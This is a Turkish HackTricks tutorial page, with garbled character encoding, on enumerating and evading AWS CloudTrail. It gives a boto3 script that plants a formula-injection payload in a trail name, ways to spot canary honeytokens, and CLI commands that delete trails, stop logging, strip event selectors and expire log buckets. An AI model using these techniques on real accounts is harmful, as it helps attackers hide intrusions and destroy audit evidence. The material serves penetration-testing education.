# AWS - CloudTrail Enum

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile AWS hacklemeyi sÄ±fÄ±rdan kahramana Ã¶ÄŸrenin!</summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

- **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
- [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
- [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
- ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)'da takip edin.
- **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± gÃ¶ndererek HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks) github depolarÄ±na PR gÃ¶ndererek paylaÅŸÄ±n.

</details>

## **CloudTrail**

AWS CloudTrail, AWS ortamÄ±nÄ±z iÃ§indeki etkinlikleri **kaydeder ve izler**. AWS kaynaklarÄ±yla yapÄ±lan tÃ¼m etkileÅŸimler iÃ§in kimin ne yaptÄ±ÄŸÄ±nÄ±, ne zaman ve nereden yaptÄ±ÄŸÄ±nÄ± iÃ§eren ayrÄ±ntÄ±lÄ± **etkinlik gÃ¼nlÃ¼klerini** kaydeder. Bu, deÄŸiÅŸikliklerin ve iÅŸlemlerin denetim izini saÄŸlayarak gÃ¼venlik analizi, uyumluluk denetimi ve kaynak deÄŸiÅŸikliÄŸi izleme konularÄ±nda yardÄ±mcÄ± olur. CloudTrail, kullanÄ±cÄ± ve kaynak davranÄ±ÅŸÄ±nÄ± anlamak, gÃ¼venlik durumlarÄ±nÄ± gÃ¼Ã§lendirmek ve dÃ¼zenleyici uyumluluÄŸu saÄŸlamak iÃ§in esastÄ±r.

Her kaydedilen etkinlik ÅŸunlarÄ± iÃ§erir:

- Ã‡aÄŸrÄ±lan API'nin adÄ±: `eventName`
- Ã‡aÄŸrÄ±lan hizmet: `eventSource`
- Zaman: `eventTime`
- IP adresi: `SourceIPAddress`
- Ajan yÃ¶ntemi: `userAgent`. Ã–rnekler:
  - Signing.amazonaws.com - AWS YÃ¶netim Konsolundan
  - console.amazonaws.com - HesabÄ±n kÃ¶k kullanÄ±cÄ±sÄ±
  - lambda.amazonaws.com - AWS Lambda
- Ä°stek parametreleri: `requestParameters`
- YanÄ±t Ã¶ÄŸeleri: `responseElements`

Etkinlikler, **yaklaÅŸÄ±k her 5 dakikada bir JSON dosyasÄ±na** yazÄ±lÄ±r, CloudTrail tarafÄ±ndan tutulur ve sonunda log dosyalarÄ± **yaklaÅŸÄ±k 15 dakika sonra S3'e iletilir**.\
CloudTrail gÃ¼nlÃ¼kleri, **hesaplar ve bÃ¶lgeler arasÄ±nda toplanabilir**.\
CloudTrail, log dosyalarÄ±nÄ± size ulaÅŸtÄ±rdÄ±ÄŸÄ±ndan beri log dosyalarÄ±nÄ±zÄ±n deÄŸiÅŸmediÄŸini doÄŸrulamak iÃ§in **log dosyasÄ± bÃ¼tÃ¼nlÃ¼ÄŸÃ¼nÃ¼ kullanmanÄ±za izin verir**. GÃ¼nlÃ¼klerin iÃ§indeki loglarÄ±n SHA-256 karmasÄ±nÄ± bir Ã¶zet dosyasÄ±nda oluÅŸturur. Yeni gÃ¼nlÃ¼klerin sha-256 karmasÄ± her saat baÅŸÄ± oluÅŸturulur.\
Bir Trail oluÅŸtururken etkinlik seÃ§icileri, log kaydedilecek izi belirtmenize olanak tanÄ±r: YÃ¶netim, veri veya iÃ§gÃ¶rÃ¼ler etkinlikleri.

GÃ¼nlÃ¼kler bir S3 kovasÄ±nda saklanÄ±r. VarsayÄ±lan olarak Sunucu TarafÄ± Åifreleme (SSE-S3) kullanÄ±lÄ±r, bu nedenle AWS iÃ§eriÄŸi ÅŸifreler, ancak ek gÃ¼venlik iÃ§in KMS ile SSE ve kendi anahtarlarÄ±nÄ±zÄ± kullanabilirsiniz.

GÃ¼nlÃ¼kler, aÅŸaÄŸÄ±daki ad biÃ§imine sahip bir **S3 kovasÄ±nda saklanÄ±r**:

- **`BucketName/AWSLogs/HesapKimliÄŸi/CloudTrail/BÃ¶lgeAdÄ±/YYY/AA/GG`**
- BucketName: **`aws-cloudtrail-logs-<hesapkimliÄŸi>-<rastgele>`**
- Ã–rnek: **`aws-cloudtrail-logs-947247140022-ffb95fe7/AWSLogs/947247140022/CloudTrail/ap-south-1/2023/02/22/`**

Her klasÃ¶rÃ¼n iÃ§inde her gÃ¼nlÃ¼ÄŸÃ¼n ÅŸu formatta bir **adÄ± olacaktÄ±r**: **`HesapKimliÄŸi_CloudTrail_BÃ¶lgeAdÄ±_YYYYAAGGTSaatDakikaZ_Rastgele.json.gz`**

GÃ¼nlÃ¼k DosyasÄ± AdlandÄ±rma KuralÄ±

![](<../../../../.gitbook/assets/image (122).png>)

AyrÄ±ca, **dosya bÃ¼tÃ¼nlÃ¼ÄŸÃ¼nÃ¼ kontrol etmek iÃ§in Ã¶zet dosyalarÄ±** aynÄ± kovada olacaktÄ±r:

![](<../../../../.gitbook/assets/image (195).png>)

### Birden Fazla Hesaptan Toplu GÃ¼nlÃ¼kler Toplama

- GÃ¼nlÃ¼k dosyalarÄ±nÄ±n iletileceÄŸi AWS hesabÄ±nda bir Deneme oluÅŸturun
- CloudTrail iÃ§in Ã§apraz hesap eriÅŸimine izin veren izinleri hedef S3 kovasÄ±na uygulayÄ±n ve eriÅŸime ihtiyacÄ± olan her AWS hesabÄ±na izin verin
- DiÄŸer AWS hesaplarÄ±nda yeni bir Trail oluÅŸturun ve 1. adÄ±mda oluÅŸturulan kovayÄ± kullanmayÄ± seÃ§in

Ancak, tÃ¼m gÃ¼nlÃ¼kleri aynÄ± S3 kovasÄ±nda saklayabilirsiniz, farklÄ± hesaplardan gelen CloudTrail gÃ¼nlÃ¼klerini tek bir AWS hesabÄ±na ait bir CloudWatch Logs'ta toplayamazsÄ±nÄ±z.

{% hint style="danger" %}
Bir hesabÄ±n **farklÄ± Trail'leri** CloudTrail'den **etkinleÅŸtirilmiÅŸ** olabilir ve aynÄ± (veya farklÄ±) gÃ¼nlÃ¼kleri farklÄ± kovalarda saklayabilir.
{% endhint %}

### 1'den tÃ¼m org hesaplarÄ±na Cloudtrail

CloudTrail oluÅŸtururken, orgdaki tÃ¼m hesaplar iÃ§in cloudtrail'Ä± etkinleÅŸtirmeyi ve gÃ¼nlÃ¼kleri yalnÄ±zca 1 kovaya almayÄ± belirtmek mÃ¼mkÃ¼ndÃ¼r:

<figure><img src="../../../../.gitbook/assets/image (200).png" alt=""><figcaption></figcaption></figure>

Bu ÅŸekilde tÃ¼m hesaplarÄ±n tÃ¼m bÃ¶lgelerinde CloudTrail'Ä± kolayca yapÄ±landÄ±rabilir ve gÃ¼nlÃ¼kleri 1 hesapta (korumanÄ±z gereken bir hesap) merkezileÅŸtirebilirsiniz.

### GÃ¼nlÃ¼k DosyalarÄ±nÄ± Kontrol Etme

GÃ¼nlÃ¼klerin deÄŸiÅŸtirilmediÄŸini kontrol etmek iÃ§in ÅŸunu Ã§alÄ±ÅŸtÄ±rarak kontrol edebilirsiniz

{% code overflow="wrap" %}
```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```
{% endcode %}

### GÃ¼nlÃ¼klerin CloudWatch'a GÃ¶nderilmesi

**CloudTrail, ÅŸÃ¼pheli aktiviteler gerÃ§ekleÅŸtirildiÄŸinde sizi uyaracak uyarÄ±larÄ± ayarlayabilmeniz iÃ§in gÃ¼nlÃ¼kleri otomatik olarak CloudWatch'a gÃ¶nderebilir.**\
CloudTrail'Ä±n gÃ¼nlÃ¼kleri CloudWatch'a gÃ¶ndermesine izin vermek iÃ§in bu eylemi gerÃ§ekleÅŸtiren bir **rol** oluÅŸturulmasÄ± gerektiÄŸine dikkat edin. MÃ¼mkÃ¼nse, bu eylemleri gerÃ§ekleÅŸtirmek iÃ§in AWS varsayÄ±lan rolÃ¼nÃ¼ kullanmanÄ±z Ã¶nerilir. Bu rol, CloudTrail'in ÅŸunlarÄ± yapmasÄ±na izin verecektir:

* CreateLogStream: Bu, bir CloudWatch GÃ¼nlÃ¼kleri gÃ¼nlÃ¼k akÄ±ÅŸÄ± oluÅŸturmayÄ± saÄŸlar
* PutLogEvents: CloudTrail gÃ¼nlÃ¼klerini CloudWatch GÃ¼nlÃ¼kleri gÃ¼nlÃ¼k akÄ±ÅŸÄ±na iletmeyi saÄŸlar

### Olay GeÃ§miÅŸi

CloudTrail Olay GeÃ§miÅŸi, kaydedilen gÃ¼nlÃ¼kleri bir tabloda incelemenize olanak tanÄ±r:

![](<../../../../.gitbook/assets/image (89).png>)

### Ä°Ã§gÃ¶rÃ¼ler

**CloudTrail Ä°Ã§gÃ¶rÃ¼ler**, CloudTrail izlerinden yazma yÃ¶netimi olaylarÄ±nÄ± otomatik olarak **analiz eder** ve **sÄ±radÄ±ÅŸÄ± aktiviteleri size bildirir**. Ã–rneÄŸin, kurulmuÅŸ temellere uymayan `TerminateInstance` olaylarÄ±nda bir artÄ±ÅŸ varsa, bunu bir Ä°Ã§gÃ¶rÃ¼ olayÄ± olarak gÃ¶receksiniz. Bu olaylar, **sÄ±radÄ±ÅŸÄ± API aktivitelerini bulmayÄ± ve yanÄ±tlamayÄ± daha da kolaylaÅŸtÄ±rÄ±r**.

Ä°Ã§gÃ¶rÃ¼ler, CloudTrail gÃ¼nlÃ¼kleriyle aynÄ± kovada saklanÄ±r: `BucketAdÄ±/AWSLogs/HesapID/CloudTrail-Insight`

### GÃ¼venlik

| CloudTrail GÃ¼nlÃ¼k DosyasÄ± BÃ¼tÃ¼nlÃ¼ÄŸÃ¼ | <ul><li>GÃ¼nlÃ¼klerin deÄŸiÅŸtirilip veya silinip silinmediÄŸini doÄŸrulayÄ±n</li><li><p>Ã–zet dosyalarÄ± kullanÄ±r (her dosya iÃ§in karmasÄ± oluÅŸtur)</p><ul><li>SHA-256 karma</li><li>Dijital imza iÃ§in SHA-256 ile RSA</li><li>Amazon'a ait Ã¶zel anahtar</li></ul></li><li>Bir Ã¶zet dosyasÄ± oluÅŸturmak 1 saat sÃ¼rer (her saat baÅŸÄ± yapÄ±lÄ±r)</li></ul> |
| ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Yetkisiz eriÅŸimi durdur              | <ul><li><p>IAM politikalarÄ± ve S3 kova politikalarÄ±nÄ± kullanÄ±n</p><ul><li>gÃ¼venlik ekibi â€”> yÃ¶netici eriÅŸimi</li><li>denetÃ§iler â€”> salt okuma eriÅŸimi</li></ul></li><li>GÃ¼nlÃ¼kleri ÅŸifrelemek iÃ§in SSE-S3/SSE-KMS kullanÄ±n</li></ul>                                                                                                                                        |
| GÃ¼nlÃ¼k dosyalarÄ±nÄ±n silinmesini Ã¶nleme | <ul><li>IAM ve kova politikalarÄ± ile silme eriÅŸimini kÄ±sÄ±tlayÄ±n</li><li>S3 MFA silmeyi yapÄ±landÄ±rÄ±n</li><li>GÃ¼nlÃ¼k DosyasÄ± DoÄŸrulamasÄ± ile doÄŸrulayÄ±n</li></ul>                                                                                                                                                                                            |

## EriÅŸim DanÄ±ÅŸmanÄ±

AWS EriÅŸim DanÄ±ÅŸmanÄ±, **insanlarÄ±n verilen gereksiz izinler** hakkÄ±nda bilgilendirilmesi iÃ§in son 400 gÃ¼nlÃ¼k AWS **CloudTrail gÃ¼nlÃ¼klerine dayanÄ±r**. CloudTrail, bir AWS hesabÄ±nda yapÄ±lan AWS API Ã§aÄŸrÄ±larÄ±nÄ±n ve ilgili olaylarÄ±n bir geÃ§miÅŸini yakalar. EriÅŸim DanÄ±ÅŸmanÄ±, bu verileri kullanarak **hizmetlerin en son ne zaman eriÅŸildiÄŸini gÃ¶sterir**. CloudTrail gÃ¼nlÃ¼klerini analiz ederek, EriÅŸim DanÄ±ÅŸmanÄ± bir IAM kullanÄ±cÄ±sÄ±nÄ±n veya rolÃ¼nÃ¼n hangi AWS hizmetlerine eriÅŸtiÄŸini ve bu eriÅŸimin ne zaman gerÃ§ekleÅŸtiÄŸini belirleyebilir. Bu, AWS yÃ¶neticilerinin **izinleri iyileÅŸtirme** konusunda bilinÃ§li kararlar almasÄ±na yardÄ±mcÄ± olur, Ã§Ã¼nkÃ¼ uzun sÃ¼re eriÅŸilmemiÅŸ hizmetleri belirleyebilir ve gerÃ§ek kullanÄ±m modellerine dayanarak aÅŸÄ±rÄ± geniÅŸ izinleri azaltabilirler.

{% hint style="success" %}
Bu nedenle, EriÅŸim DanÄ±ÅŸmanÄ±, **kullanÄ±cÄ±lara verilen gereksiz izinler** hakkÄ±nda bilgi verir, bÃ¶ylece yÃ¶netici bunlarÄ± kaldÄ±rabilir
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

## Eylemler

### NumaralandÄ±rma
```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```
### **CSV Enjeksiyonu**

CloudTrail iÃ§inde bir CVS enjeksiyonu gerÃ§ekleÅŸtirmek mÃ¼mkÃ¼ndÃ¼r ve gÃ¼nlÃ¼kler CSV olarak dÄ±ÅŸa aktarÄ±lÄ±p Excel ile aÃ§Ä±ldÄ±ÄŸÄ±nda keyfi kodu yÃ¼rÃ¼tÃ¼r.\
AÅŸaÄŸÄ±daki kod, yÃ¼k iÃ§eren kÃ¶tÃ¼ bir Trail adÄ± iÃ§eren gÃ¼nlÃ¼k giriÅŸi oluÅŸturacaktÄ±r:
```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
Name=payload,
S3BucketName="random"
)
print(response)
```
Daha fazla CSV Enjeksiyonu hakkÄ±nda bilgi iÃ§in sayfayÄ± kontrol edin:

{% embed url="https://book.hacktricks.xyz/pentesting-web/formula-injection" %}

Bu belirli teknik hakkÄ±nda daha fazla bilgi iÃ§in [https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/](https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/)

## **AlgÄ± Atlatma**

### HoneyTokenlar **atlatma**

HoneyTokenlar, **duyarlÄ± bilgilerin dÄ±ÅŸa aktarÄ±lmasÄ±nÄ± tespit etmek** iÃ§in oluÅŸturulmuÅŸtur. AWS iÃ§in, bunlar **kullanÄ±mÄ± izlenen AWS anahtarlarÄ±** olup, eÄŸer bir ÅŸey o anahtarla bir eylemi tetiklerse, o zaman biri o anahtarÄ± Ã§almÄ±ÅŸ olmalÄ±dÄ±r.

Ancak, [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren) gibi HoneyTokenlar ya tanÄ±nabilir bir hesap adÄ± kullanÄ±yor ya da tÃ¼m mÃ¼ÅŸterileri iÃ§in aynÄ± AWS hesap kimliÄŸini kullanÄ±yor. Bu nedenle, Cloudtrail'in herhangi bir gÃ¼nlÃ¼k oluÅŸturmadan hesap adÄ±nÄ± ve/veya hesap kimliÄŸini alabilirseniz, **anahtarÄ±n bir HoneyToken olup olmadÄ±ÄŸÄ±nÄ± bilebilirsiniz**.

[**Pacu**](https://github.com/RhinoSecurityLabs/pacu/blob/79cd7d58f7bff5693c6ae73b30a8455df6136cca/pacu/modules/iam\_\_detect\_honeytokens/main.py#L57), bir anahtarÄ±n [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren)'a ait olup olmadÄ±ÄŸÄ±nÄ± tespit etmek iÃ§in bazÄ± kurallara sahiptir:

* EÄŸer **rol adÄ±nda `canarytokens.org`** veya hata mesajÄ±nda **`534261010715`** hesap kimliÄŸi gÃ¶rÃ¼nÃ¼yorsa.
* Daha yeni test edildiklerinde, hesap **`717712589309`** kullanÄ±yor ve hala isimde **`canarytokens.com`** dizesi bulunuyor.
* EÄŸer **rol adÄ±nda `SpaceCrab`** hata mesajÄ±nda gÃ¶rÃ¼nÃ¼yorsa.
* **SpaceSiren**, kullanÄ±cÄ± adlarÄ± oluÅŸturmak iÃ§in **uuid'ler** kullanÄ±r: `[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89aAbB][a-f0-9]{3}-[a-f0-9]{12}`
* EÄŸer **isim rastgele oluÅŸturulmuÅŸ gibi gÃ¶rÃ¼nÃ¼yorsa**, yÃ¼ksek ihtimallerle bir HoneyToken'dÄ±r.

#### Hesap KimliÄŸini Anahtar KimliÄŸinden AlÄ±n

**KodlanmÄ±ÅŸ** iÃ§indeki **eriÅŸim anahtarÄ±**ndan **Hesap KimliÄŸi**ni alabilir ve hesap kimliÄŸini HoneyTokenlar AWS hesaplarÄ±nÄ±zÄ±n listesiyle kontrol edebilirsiniz: [**burada aÃ§Ä±klandÄ±ÄŸÄ± gibi**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489)
```python
import base64
import binascii

def AWSAccount_from_AWSKeyID(AWSKeyID):

trimmed_AWSKeyID = AWSKeyID[4:] #remove KeyID prefix
x = base64.b32decode(trimmed_AWSKeyID) #base32 decode
y = x[0:6]

z = int.from_bytes(y, byteorder='big', signed=False)
mask = int.from_bytes(binascii.unhexlify(b'7fffffffff80'), byteorder='big', signed=False)

e = (z & mask)>>7
return (e)

print("account id:" + "{:012d}".format(AWSAccount_from_AWSKeyID("ASIAQNZGKIQY56JQ7WML")))
```
Daha fazla bilgi iÃ§in [**orijinal araÅŸtÄ±rmaya**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489) bakÄ±n.

#### GÃ¼nlÃ¼k oluÅŸturma

Bunun iÃ§in en etkili teknik aslÄ±nda basit bir tekniktir. BulduÄŸunuz anahtarÄ± kullanarak kendi saldÄ±rgan hesabÄ±nÄ±z iÃ§inde bir hizmete eriÅŸin. Bu, **CloudTrail'in kendi AWS hesabÄ±nÄ±zda bir gÃ¼nlÃ¼k oluÅŸturmasÄ±nÄ± saÄŸlar ve kurbanÄ±n iÃ§inde deÄŸil**.

Mesele ÅŸu ki, Ã§Ä±ktÄ± size bir hata gÃ¶sterecek ve hesap kimliÄŸini ve hesap adÄ±nÄ± gÃ¶stereceÄŸinden **bir BalÄ±k AnahtarÄ± olup olmadÄ±ÄŸÄ±nÄ± gÃ¶rebileceksiniz**.

#### GÃ¼nlÃ¼k oluÅŸturmayan AWS hizmetleri

GeÃ§miÅŸte **CloudTrail'e gÃ¼nlÃ¼k gÃ¶ndermeyen bazÄ± AWS hizmetleri** vardÄ± (burada bir [liste bulabilirsiniz](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html)). Bu hizmetlerden bazÄ±larÄ±, yetkisiz biri (balÄ±k anahtarÄ± anahtarÄ±) eriÅŸmeye Ã§alÄ±ÅŸtÄ±ÄŸÄ±nda **anahtar rolÃ¼n ARN'sini iÃ§eren bir hata ile yanÄ±t verecektir**.

Bu ÅŸekilde, bir **saldÄ±rgan gÃ¼nlÃ¼k tetiklemeden anahtarÄ±n ARN'sini elde edebilir**. ARN iÃ§inde saldÄ±rgan, **AWS hesap kimliÄŸini ve adÄ±nÄ±** gÃ¶rebilir, bu sayede bir saldÄ±rgan BalÄ±k AnahtarlarÄ±nÄ±n ÅŸirketlerin hesap kimliklerini ve adlarÄ±nÄ± kolayca belirleyebilir, bÃ¶ylece bir saldÄ±rgan balÄ±k anahtarÄ±nÄ±n bir BalÄ±k AnahtarÄ± olup olmadÄ±ÄŸÄ±nÄ± belirleyebilir.

![](<../../../../.gitbook/assets/image (93).png>)

{% hint style="danger" %}
TÃ¼m genel API'larÄ±n CloudTrail gÃ¼nlÃ¼kleri oluÅŸturmadÄ±ÄŸÄ± keÅŸfedildi ve ÅŸimdi dÃ¼zeltildi, bu yÃ¼zden belki kendi API'lerinizi bulmanÄ±z gerekebilir...

Daha fazla bilgi iÃ§in [**orijinal araÅŸtÄ±rmaya**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/) bakÄ±n.
{% endhint %}

### ÃœÃ§Ã¼ncÃ¼ AltyapÄ±ya EriÅŸim

Belirli AWS hizmetleri **veritabanlarÄ±** veya **Kubernetes** kÃ¼meleri (EKS) gibi **altyapÄ±lar oluÅŸturabilir**. Bir kullanÄ±cÄ±, bu hizmetlere doÄŸrudan eriÅŸiyorsa (Ã¶rneÄŸin Kubernetes API'si gibi), **AWS API'sini kullanmayacak**, bu nedenle CloudTrail bu iletiÅŸimi gÃ¶remeyecektir.

Bu nedenle, EKS'ye eriÅŸimi olan bir kullanÄ±cÄ±, EKS API'sinin URL'sini keÅŸfetmiÅŸse yerel olarak bir belirteÃ§ oluÅŸturabilir ve **CloudTrail tarafÄ±ndan tespit edilmeden API hizmeti ile doÄŸrudan iletiÅŸim kurabilir**.

Daha fazla bilgi iÃ§in:

{% content-ref url="../../aws-post-exploitation/aws-eks-post-exploitation.md" %}
[aws-eks-post-exploitation.md](../../aws-post-exploitation/aws-eks-post-exploitation.md)
{% endcontent-ref %}

### CloudTrail YapÄ±landÄ±rmasÄ±nÄ± DeÄŸiÅŸtirme

#### Ä°z yollarÄ±nÄ± silme
```bash
aws cloudtrail delete-trail --name [trail-name]
```
#### Ä°zlemeleri Durdurun
```bash
aws cloudtrail stop-logging --name [trail-name]
```
#### Ã‡oklu bÃ¶lge kaydÄ±nÄ± devre dÄ±ÅŸÄ± bÄ±rakma

{% code overflow="wrap" %}
```bash
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```
{% endcode %}

#### Olay SeÃ§enekleriyle GÃ¼nlÃ¼ÄŸÃ¼ Devre DÄ±ÅŸÄ± BÄ±rakma

{% code overflow="wrap" %}
```bash
# Leave only the ReadOnly selector
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[{"ReadWriteType": "ReadOnly"}]' --region <region>

# Remove all selectors (stop Insights)
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[]' --region <region>
```
{% endcode %}

Ä°lk Ã¶rnekte, tek bir olay seÃ§ici, yalnÄ±zca bir nesne iÃ§eren bir JSON dizisi olarak saÄŸlanmaktadÄ±r. `"ReadWriteType": "ReadOnly"` ifadesi, olay seÃ§icinin yalnÄ±zca salt okunur olaylarÄ± yakalamasÄ± gerektiÄŸini belirtir (bu nedenle CloudTrail iÃ§gÃ¶rÃ¼leri Ã¶rneÄŸin yazma olaylarÄ±nÄ± kontrol etmeyecek).

Ã–zel gereksinimlerinize gÃ¶re olay seÃ§icisini Ã¶zelleÅŸtirebilirsiniz.

#### S3 yaÅŸam dÃ¶ngÃ¼sÃ¼ politikasÄ± aracÄ±lÄ±ÄŸÄ±yla kayÄ±tlarÄ±n silinmesi
```bash
aws s3api put-bucket-lifecycle --bucket <bucket_name> --lifecycle-configuration '{"Rules": [{"Status": "Enabled", "Prefix": "", "Expiration": {"Days": 7}}]}' --region <region>
```
{% endcode %}

### Kova YapÄ±landÄ±rmasÄ±nÄ± DeÄŸiÅŸtirme

* S3 kovasÄ±nÄ± sil
* Kova politikasÄ±nÄ± deÄŸiÅŸtirerek CloudTrail hizmetinden herhangi bir yazma iÅŸlemini reddet
* S3 kovasÄ±na nesneleri silmek iÃ§in yaÅŸam dÃ¶ngÃ¼sÃ¼ politikasÄ± ekle
* CloudTrail gÃ¼nlÃ¼klerini ÅŸifrelemek iÃ§in kullanÄ±lan kms anahtarÄ±nÄ± devre dÄ±ÅŸÄ± bÄ±rak

### Cloudtrail fidye yazÄ±lÄ±mÄ±

#### S3 fidye yazÄ±lÄ±mÄ±

**Asimetrik bir anahtar oluÅŸturabilir** ve **CloudTrail'in verileri** o anahtarla **ÅŸifrelemesini saÄŸlayabilir** ve ardÄ±ndan **Ã¶zel anahtarÄ± silerek** CloudTrail iÃ§eriÄŸinin kurtarÄ±lamamasÄ±nÄ± saÄŸlayabilirsiniz.\
Bu temelde **S3-KMS fidye yazÄ±lÄ±mÄ±**'dÄ±r ve ÅŸurada aÃ§Ä±klanmÄ±ÅŸtÄ±r:

{% content-ref url="../../aws-post-exploitation/aws-s3-post-exploitation.md" %}
[aws-s3-post-exploitation.md](../../aws-post-exploitation/aws-s3-post-exploitation.md)
{% endcontent-ref %}

**KMS fidye yazÄ±lÄ±mÄ±**

Bu, Ã¶nceki saldÄ±rÄ±yÄ± farklÄ± izin gereksinimleriyle gerÃ§ekleÅŸtirmenin en kolay yoludur:

{% content-ref url="../../aws-post-exploitation/aws-kms-post-exploitation.md" %}
[aws-kms-post-exploitation.md](../../aws-post-exploitation/aws-kms-post-exploitation.md)
{% endcontent-ref %}

## **Referanslar**

* [https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory](https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory)

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**]'na gÃ¶z atÄ±n (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini alÄ±n**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **ğŸ’¬ [Discord grubuna katÄ±lÄ±n](https://discord.gg/hRep4RUj7f)** veya [telegram grubuna katÄ±lÄ±n](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
